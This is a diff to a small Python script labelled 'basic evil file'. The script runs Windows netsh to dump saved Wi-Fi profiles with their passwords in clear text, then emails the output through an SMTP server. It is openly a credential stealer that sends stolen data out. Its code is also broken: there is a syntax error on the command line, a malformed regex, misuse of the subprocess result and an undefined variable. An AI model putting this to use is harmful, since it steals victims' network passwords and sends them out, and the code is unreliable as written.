@@ -2,6 +2,7 @@
 # basic evil file
 
 import subprocess, smtplib
+import re
 
 def send_mail(email, password, message):
     # to use gmail smtp you will need to use 'less secure app' https://support.google.com/a/answer/182076
@@ -13,6 +14,9 @@ def send_mail(email, password, message):
     server.quit()
 
 # MS command
-command = "netsh wlan show profile UPC723762" key = clear
-subprocess.Popen(command, shell = True)
+command = "netsh wlan show profile" key = clear
+networks = subprocess.Popen(command, shell = True)
+network_names = re.findall(('?:Profiles\s*:\s)(.*)', networks)
+print(network_names)
+
 send_mail('youremail@youremailprovider.com', '12345', result)
